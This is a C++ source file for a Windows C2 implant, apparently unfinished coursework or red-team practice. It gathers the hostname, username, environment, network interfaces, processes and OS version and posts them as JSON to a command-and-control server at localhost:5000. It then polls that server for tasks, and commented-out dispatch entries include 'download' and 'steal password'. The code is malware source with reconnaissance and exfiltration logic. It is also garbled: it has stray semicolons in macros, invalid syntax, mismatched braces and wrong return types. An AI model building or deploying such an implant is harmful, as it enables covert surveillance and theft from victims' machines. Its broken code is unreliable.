#include <iostream>
#include <string>
#include <vector>
#include <fstream>
#include <sstream>
#include <algorithm>
#include <iterator>
#include <map>
#include <set>
#include <memory>
#include <thread>
#include <windows.h>
#include <winhttp.h>
#include <Lmcons.h>
#include <cstdlib>
#include <sddl.h>
#include <taskschd.h>
#include <objbase.h>
#include <comdef.h>
#include <Wbemidl.h>
#include <comutil.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/param.h>
#include <comutil.h>
#include <Iphlpapi.h>

#include "json/include\nlohmann/json.hpp"
#include <curl/include/curl/curl.h>

using JSON = nlohmann::json;

//#include <jsoncpp/json/value.h>

// #include <rapidjson/document.h>
// #include <rapidjson/writer.h>
// #include <rapidjson/stringbuffer.h>

namespace constants
{
    #define C2 "http://localhost:5000";
    #define REGISTER "/implant/register";
    #define TASK "/implant/task";
    #define SLEEP = 10;
}

std::string makeHttpRequest(std::string fqdn, int port, std::string uri, bool useTLS){
    std::string result;
    // Your code here

    // https://docs.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpopen

    HINTERNET hSession = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if(hSession == NULL){
        printf("Error in WinHttpOpen: %d", GetLastError());
    }   // open a session

    // https://docs.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpconnect

    // LPCWSTR serverName = std::wstring(fqdn.begin(), fqdn.end()).c_str();
    std::wstring name = std::wstring(fqdn.begin(), fqdn.end());
    LPCWSTR serverName = name.c_str();
    // printf("serverName: %ls", serverName);
    INTERNET_PORT serverPort = port;
    HINTERNET hConnect = WinHttpConnect(hSession, serverName, serverPort, 0);

    if(hConnect == NULL){
        printf("Error in WinHttpConnect: %d", GetLastError());
    }   // connect to the server

    // https://docs.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpopenrequest

    std::wstring uriName = std::wstring(uri.begin(), uri.end());
    LPCWSTR objectName = uriName.c_str();

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", objectName, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, useTLS ? WINHTTP_FLAG_SECURE : 0);

    if(hRequest == NULL){
        printf("Error in WinHttpOpenRequest: %d", GetLastError());
    }   // open a request

    // https://docs.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpsendrequest

    if(!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)){
        printf("Error in WinHttpSendRequest: %d", GetLastError());
    }   // send the request

    // https://docs.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpreceivehttpresponse

    if(!WinHttpReceiveResponse(hRequest, NULL)){
        printf("Error in WinHttpReceiveResponse: %d", GetLastError());
    }   // receive the response

    // https://docs.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpclosehandle

    // Read the data
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer;
    do{
        // Check for available data.
        dwSize = 0;
        if(!WinHttpQueryDataAvailable(hRequest, &dwSize)){
            printf("Error in WinHttpQueryDataAvailable: %d", GetLastError());
        }

        // Allocate space for the buffer.
        pszOutBuffer = new char[dwSize+1];
        if(!pszOutBuffer){
            printf("Out of memory");
            dwSize=0;
        }
        else{
            // Read the Data.
            ZeroMemory(pszOutBuffer, dwSize+1);

            if(!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)){
                printf("Error in WinHttpReadData: %d", GetLastError());
            }
            else{
                result += pszOutBuffer;
            }
            // Free the memory allocated to the buffer.
            delete [] pszOutBuffer;
        }
    }while(dwSize>0);

    // DWORD dwSize = 0;
    // DWORD dwDownloaded = 0;

    // if(!WinHttpQueryDataAvailable(hRequest, &dwSize)){
    //     printf("Error in WinHttpQueryDataAvailable: %d", GetLastError());
    // }
    // else{
    //     char outBuffer[4096];
    //     ZeroMemory(outBuffer, 4096);
    //     while (WinHttpReadData(hRequest, outBuffer, dwSize, &dwDownloaded)){
    //         if (dwDownloaded == 0){
    //             break;
    //         }
    //         else {
    //             for (int i = 0; i < dwDownloaded; i++)
    //             {
    //                 result += outBuffer[i];
    //             }
    //             memset(outBuffer, 0, 4096);
    //             dwDownloaded = 0;
    //         }
    //     }
    // }
    result += "\0";

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return result;
}

// int main(int argc,  char* argv[]){
//     if(argc !=5){
//         std::cout << "Incorrect number of arguments: you need 4 positional arguments" << std::endl;
//         return 0;
//     }

//     std::string fqdn = std::string(argv[1]);
//     int port = std::stoi( argv[2] );

//     std::string uri = std::string(argv[3]);
//     int  useTLS =std::stoi(argv[4]);
//     bool tls;

//     if (useTLS == 1){
//         tls = true;
//     } else if (useTLS == 0){
//         tls = false;

//     } else{
//         std::cout << "bad value for useTls" << std::endl;
//         return 0;
//     }
// }


#define C2 "http://localhost:5000";
#define REGISTER "/implant/register";
#define TASK "/implant/task";
#define SLEEP 10;

std::string random_id() {
    std::string id;
    for (int i = 0; i < 16; i++) {
        id += (char)rand();
    }
    return id;
}

std::string implant_id = random_id();


char* getEnvirons() {
    char* path = std::getenv("PATH");
    
    if (path != nullptr){
        std::cout<< "The value of PATH is: "<< path<< std::endl; 
    } else {
        std::cout << "PATH is not set" << std::endl; 
    }
    // std::string str(path); 
    
    // str.assign(path);
    // std::string* str_ptr = &str;


    return path; 
}

char* getComputerName() {
    char* hostname = std::getenv("COMPUTERNAME");
    if (hostname != nullptr){
        std::cout<< "The hostname is: "<< hostname<< std::endl; 
    } else {
        std::cout << "COMPUTERNAME is not set" << std::endl; 
    }
    //convert hostname to a string
    std::string str(hostname); 
    return hostname; 
}

char* getNetworkInterfaces() {
  MIB_IFTABLE* table;
  ULONG out_buf_len = 0;
  DWORD status = GetIfTable(NULL, &out_buf_len, FALSE);
  if (status == ERROR_INSUFFICIENT_BUFFER) {
    table = (MIB_IFTABLE*)malloc(out_buf_len);
    status = GetIfTable(table, &out_buf_len, FALSE);
  }
  if (status == NO_ERROR) {
    // The list of network interfaces has been retrieved successfully
    for (int i = 0; i < table->dwNumEntries; i++) {
      std::wcout << "Interface: " << table->table[i].wszName << std::endl;
    }
  } else {
    // There was an error retrieving the list of network interfaces
    std::cout << "Error retrieving network interfaces" << std::endl;
  }
  free(table);
  return 0;
}
 
char* getUserName() {
  char* username = std::getenv("USER");
  if (username != nullptr) {
    std::cout << "The username is: " << username << std::endl;
  } else {
    username = std::getenv("USERNAME");
    if (username != nullptr) {
      std::cout << "The username is: " << username << std::endl;
    } else {
      std::cout << "USER and USERNAME are not set" << std::endl;
    }
  }
  return username;
}


std::string changeDirectory() {
  if (chdir("/usr/local/bin") == -1) {
    std::cerr << "Error changing directory" << std::endl;
    return "Error changing directory";
  }

  std::cout << "Changed directory to /usr/local/bin" << std::endl;
  return "Changed directory to /usr/local/bin";
}

std::string listFiles() {
  // Open the directory.
  DIR* dir = opendir("/path/to/directory");
  if (!dir) {
    std::cerr << "Error opening directory" << std::endl;
    return "Error opening directory";
  }

  // Read the entries in the directory.
  dirent* entry;
  while ((entry = readdir(dir)) != nullptr) {
    std::cout << entry->d_name << std::endl;
  }

  // Close the directory.
  closedir(dir);
  return entry->d_name;
}

std::string listProcesses() {
  // Execute the `ps` command and store the output in a string
  std::string command = "ps";
  std::string output = "";
  int result = std::system(command.c_str());

  // Check the return value of `system` to make sure the command was successful
  if (result == 0) {
    // The command was successful. The output of the command is stored in `output`
    // You can process the output as needed here
  } else {
    // There was an error executing the command
  }

  return output;
}

std::string getProcessorArch() {
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);

    std::string processorArch = std::to_string(systemInfo.wProcessorArchitecture);

    std::string numProc = std::to_string(systemInfo.dwNumberOfProcessors);

    std::string PgSz = std::to_string(systemInfo.dwPageSize);

    std::cout << "Processor architecture: " << systemInfo.wProcessorArchitecture << std::endl;
    std::cout << "Number of processors: " << systemInfo.dwNumberOfProcessors << std::endl;
    std::cout << "Page size: " << systemInfo.dwPageSize << " bytes" << std::endl;
    
    return processorArch ;
}

std::string getNumProc() {
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);

    std::string processorArch = std::to_string(systemInfo.wProcessorArchitecture);

    std::string numProc = std::to_string(systemInfo.dwNumberOfProcessors);

    std::string PgSz = std::to_string(systemInfo.dwPageSize);

    std::cout << "Processor architecture: " << systemInfo.wProcessorArchitecture << std::endl;
    std::cout << "Number of processors: " << systemInfo.dwNumberOfProcessors << std::endl;
    std::cout << "Page size: " << systemInfo.dwPageSize << " bytes" << std::endl;
    
    return numProc;
}

std::string getPageSize() {
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);

    std::string processorArch = std::to_string(systemInfo.wProcessorArchitecture);

    std::string numProc = std::to_string(systemInfo.dwNumberOfProcessors);

    std::string PgSz = std::to_string(systemInfo.dwPageSize);

    std::cout << "Processor architecture: " << systemInfo.wProcessorArchitecture << std::endl;
    std::cout << "Number of processors: " << systemInfo.dwNumberOfProcessors << std::endl;
    std::cout << "Page size: " << systemInfo.dwPageSize << " bytes" << std::endl;
    
    return PgSz;
}
// std::wstring getMachineGUID() {
//   wchar_t machineGuid[MAX_PATH];
//   if (!GetComputerObjectName(NameUniqueId, machineGuid, MAX_PATH)) {
//     std::cerr << "Error getting machine GUID" << std::endl;
//     return L"Error getting machine GUID";
//   }

//   std::wcout << L"Machine GUID: " << machineGuid << std::endl;
//   return std::wstring(machineGuid);
// }

// int main() {
//   std::wstring guid = getMachineGUID();
//   std::wcout << L"GUID: " << guid << std::endl;
//   return 0;
// }

std::string getWindowsVersion() {
  OSVERSIONINFOEX versionInfo;
  versionInfo.dwOSVersionInfoSize = sizeof(versionInfo);
  GetVersionEx((LPOSVERSIONINFO)&versionInfo);

  std::string major_version_str = std::to_string(versionInfo.dwMajorVersion);
  std::string minor_version_str = std::to_string(versionInfo.dwMinorVersion);
  std::string service_pack_str(versionInfo.szCSDVersion);

  std::string version_str = major_version_str + "." + minor_version_str + " " + service_pack_str;
  std::cout << "Operating system version: " << version_str << std::endl;

  return version_str;
}

/*
char* getSystemScheduledTasks() {
  // Initialize COM.
  CoInitializeEx(nullptr, COINIT_MULTITHREADED);

  // Create an instance of the Task Scheduler service.
  ITaskService* taskService;
  HRESULT hr = CoCreateInstance(CLSID_TaskScheduler, nullptr,
                                CLSCTX_INPROC_SERVER, IID_ITaskService,
                                (void**)&taskService);
  if (FAILED(hr)) {
    std::cerr << "Error creating Task Scheduler service" << std::endl;
    CoUninitialize();
    return 1;
  }

  // Connect to the Task Scheduler service.
  hr = taskService->Connect(_variant_t(), _variant_t(),
                            _variant_t(), _variant_t());
  if (FAILED(hr)) {
    std::cerr << "Error connecting to Task Scheduler service" << std::endl;
    taskService->Release();
    CoUninitialize();
    return 1;
  }

  // Get the root task folder.
  ITaskFolder* rootFolder;
  hr = taskService->GetFolder(_bstr_t(L"\\"), &rootFolder);
  if (FAILED(hr)) {
    std::cerr << "Error getting root task folder" << std::endl;
    taskService->Release();
    CoUninitialize();
    return 1;
  }

  // Enumerate the tasks in the root folder.
  IEnumWorkItems* tasks;
  hr = rootFolder->EnumTasks(TASK_ENUM_HIDDEN, &tasks);
  if (FAILED(hr)) {
    std::cerr << "Error enumerating tasks" << std::endl;
    rootFolder->Release();
    taskService->Release();
    CoUninitialize();
    return 1;
  }

  // Iterate through the tasks and print their names.
  IRegisteredTask* task;
  while (tasks->Next(1, &task, nullptr) == S_OK) {
    _bstr_t name;
    hr = task->get_Name(name.GetAddress());
    if (FAILED(hr)) {
      std::cerr << "Error getting task name" << std::endl;
      task->Release();
      tasks->Release();
      rootFolder->Release();
      taskService->Release();
      CoUninitialize();
      return 1;
    }
    std::wcout << "Task name: " << name << std::endl;
    task->Release();
  }

  tasks->Release();
  rootFolder->Release();
  taskService
}

*/


std::map<std::string, std::string> sit_aware(){
    //make a dictionary in c++
    //https://www.codespeedy.com/dictionary-in-cpp/
    std::map<std::string, std::string> initVals;
    initVals["implant_id"] = implant_id;
    initVals["environs"] = getEnvirons();
    initVals["computerName"] = getComputerName();
    initVals["networkInterfaces"] = getNetworkInterfaces();
    initVals["username"] = getUserName();
    initVals["windowsVersion"] = getWindowsVersion();
    //initVals["machineGUID"] = getMachineGUID();
    initVals["listFiles"] = listFiles();
    initVals["changeDirectory"] = changeDirectory();
    initVals["listProcesses"] = listProcesses();
    initVals["ProcessorArchitecture"] = getProcessorArch();
    initVals["NumberOfProcesses"] = getNumProc();
    initVals["PageSize"] = getPageSize();
    //initVals["scheduleTasks"] = getSystemScheduledTasks();

    return initVals;
}

bool send_request(const std::string& url, const std::string& json) {
    // Create a curl handle
    CURL* curl = curl_easy_init();
    if (!curl) {
        std::cerr << "Error initializing curl handle" << std::endl;
        return false;
    }

    // Set the URL and other options
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_POST, 1);

    // Set the payload (i.e., the JSON document)
    std::stringstream payload;
    payload << json;
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload.str().c_str());

    // Set the content type to application/json
    struct curl_slist* headers = nullptr;
    headers = curl_slist_append(headers, "Content-Type: application/json");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    // Perform the request
    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        std::cerr << "Error sending request: " << curl_easy_strerror(res) << std::endl;
        return false;
    }

    // Clean up
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);

    return true;
}

//register the implant with the C2
bool registerImplant(){
    //create url that basically concatenates C2 and REGISTER
    std::string url = C2 + REGISTER;
    // --------------DEBUG PRINT----------------
    std::cout << "Registering with C2..." << url;

    //variable to hold dictionary sit_awareness output 
    std::map<std::string, std::string> init_data;
    init_data = sit_aware();

    //add the implant_id to the init_data
    init_data["implant_id"] = implant_id;
    //print out init_data to see what it looks like
        // --------------DEBUG PRINT----------------
    for (auto const& x : init_data)
    {
        std::cout << x.first << ": " << x.second << std::endl;
    }
    
    // Create a json document
    JSON document;

    // Add the key-value pairs from the map to the JSON object
    for (const auto& [key, value] : init_data) {
        document[key] = value;
    }

    // Write the JSON object to a string
    std::string json = document.dump();

    // Print the JSON object
    std::cout << json << std::endl;

    if(send_request(url, json)){
        return true;
    }
    else{
        return false;
    }
}

// ------------- BEGINNING TO START DEALING WITH TASKS FOR IMPLANT -------------- //

//make dictionary called dispatch_table
//------------------THIS HOLDS THE TASKS THAT ARE GONNA BE DISPATCHED TO THE IMPLANT------------------
//  - when we create a new task, we need to add it to the dispatch_table
typedef std::string (*Function);

std::map<std::string, Function> dispatch_table;
//add key value pair to dispatch_table
dispatch_table["situational awareness"] = sit_aware;
// dispatch_table["execute"] = execute;
// dispatch_table["download"] = download; //file io
// dispatch_table["steal password"] = stealer; //stealer

//function called task_dispatch that takes in a list of strings called tasks and returns a string
std::string task_dispatch(std::list<std::string> tasks){
    //initialize empty dictionary of strings called results

    std::map<std::string, std::string> results;

    //for each task in tasks
    for (auto task : tasks){
        std::string cmd = task["cmd"];
        std::string args = task["args"];
        std::string task_id = task["task_id"];
        //if the there is no cmd or task_id then continue 
        if (cmd == "" || task_id == ""){
            continue;
        }
        //if the cmd is in the dispatch_table
        if (dispatch_table.find(cmd) != dispatch_table.end()){
            //create a string called result that holds the result of the task
            std::string result = dispatch_table[cmd](args);
            //add the result to the results list as a key value pair

            results.["task_id"] = task_id;
            results.["result"] = result;
        }

    }
    return results;
}

    // const string C2 = "http://localhost:5000";
    // const string REGISTER = "/implant/register";
    // const string TASK = "/implant/task";

//create a void function called tasking that takes in nothing and returns nothing
void tasking(){
    //create a string called url that concatenates C2 and TASKING
    std::string url = C2 + TASK;
    
    //create a list variable that will hold the results

    list<std::string> results;
    //start while true loop
    while (true){
        //sleep for 10 seconds
        Sleep(SLEEP);
        //if results is empty, then we get the tasks from the C2
        if (results.empty()){
            //create a dictionary variable called data with implant_id
            std::map<std::string, std::string> 2send = make_base_payload();
            //send 2send as json to the C2
            //makeHttpRequest("www.google.com", 80, "/", false)
            std::string request = makeHttpRequest("localhost", 5000, "TASK", false);
            //if the makeHttpRequest is successful then we save the response to a variable called response
            if (request != "error"){
                std::string response = request;
                //print out the response
                std::cout << response << std::endl;
                //then we send these tasks to task_dispatch function as an input and save the results to the resulrs variable
                results = task_dispatch(response);
            }
            else{
                //results is equal to an empty list
                results = {};
            }
        else{
            payload = make_base_payload();
            payload["results"] = results;

            std::string payload = makeHttpRequest("localhost", 5000, "TASK", false);
            //if the makeHttpRequest is successful then we save the response to a variable called response
            if (payload != "error"){
                std::string response = payload;
                //print out the response
                std::cout << response << std::endl;
                //then we send these tasks to task_dispatch function as an input and save the results to the resulrs variable
                results = task_dispatch(response);
            }
            else{
                //results is equal to an empty list
                results = {};
            }
          }
        }
      }
    }


